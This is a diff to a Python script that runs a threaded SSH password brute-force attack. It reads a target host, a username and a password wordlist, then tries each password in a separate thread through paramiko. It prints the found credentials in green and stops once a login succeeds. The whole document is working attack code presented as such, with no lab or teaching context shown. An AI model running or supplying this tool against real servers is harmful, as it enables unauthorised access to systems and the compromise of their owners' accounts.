@@ -1,21 +1,23 @@
 import paramiko, sys, os, socket, termcolor
+import threading, time
+
+stopFlag = 0
 
 # Try to astablish an SSH connection
 def sshConnect(password, code=0):
+    global stopFlag
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
         ssh.connect(host, port=22, username=username, password=password)
+        stopFlag = 1
+        print(termcolor.colored((f"[+] The SSH password has been found: {password} | Username: {username}"), 'green'))
 
-    except paramiko.AuthenticationException:
-        code = 1
-
-    except socket.error as e:
-        code = 2
+    except:
+        print(termcolor.colored(f'[-] Incorrect Password: {password}', 'red'))
 
     ssh.close()
-    return code
 
 
 host = input('[+] Target Address: ')
@@ -27,26 +29,20 @@ if os.path.exists(fileInput) == False:
     print('Specified password file does not exist')
     sys.exit(1)
 
+print(f'[***] Starting Threaded SSH BruteForce on {host} With Username {username} [***]')
+
 with open(fileInput, 'r') as file:
     
+    # Join the threads and close the program if the correct passowrd is found
     for line in file.readlines():
+        if stopFlag == 1:
+            t.join()
+            exit()
+
         password = line.strip('\n')
 
-        try: # TODO: implement sshConnect function
-            response = sshConnect(password)
+        # Create the threads
+        t = threading.Thread(target=sshConnect, args=(password,))
+        t.start()
+        time.sleep(0.07)
 
-            if response == 0:
-                print(termcolor.colored((f"[+] The SSH password has been found: {password} | Username: {username}"), 'green'))
-                break
-
-            elif response == 1:
-                print(f'[-] Incorrect Password: {password}')
-
-            elif response == 2:
-                print(f'[!!!] Unable to Connect to SSH host {host}. Make sure the target is online!')
-                sys.exit(1)
-        
-        except Exception as e:
-            
-            print(e)
-            pass
